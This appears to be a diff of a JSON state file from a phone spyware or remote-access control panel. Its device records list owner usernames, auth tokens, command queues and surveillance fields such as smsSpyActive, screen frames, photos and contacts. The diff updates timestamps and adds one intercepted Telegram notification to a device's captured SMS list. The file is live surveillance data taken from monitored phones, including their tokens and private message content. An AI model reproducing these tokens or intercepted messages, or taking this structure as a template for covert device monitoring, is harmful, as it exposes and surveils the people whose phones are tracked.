@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776845593887,
+    "lastSeen": 1776845607375,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -5980,7 +5980,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "e0d08160e2e7174ce4ecac4f3a5a0002",
-    "lastSeen": 1776845595219,
+    "lastSeen": 1776845607142,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T08:12:20.623Z",
@@ -5995,7 +5995,16 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Pegasus Bot",
+        "content": "🖼 💰 Request Donasi Baru!\n\n👤 User     : YAPIK ROWRR\n💵 Nominal  : Rp 5.000\n🕐 Waktu    : 22/4/2026, 15.13.12\n\nSetujui untuk tambahkan saldo user.",
+        "time": "22/04 15:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776845596007
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
@@ -7856,7 +7865,7 @@
           "isLaunchable": false
         }
       ],
-      "receivedAt": 1776845561923
+      "receivedAt": 1776845607841
     }
   }
 ]
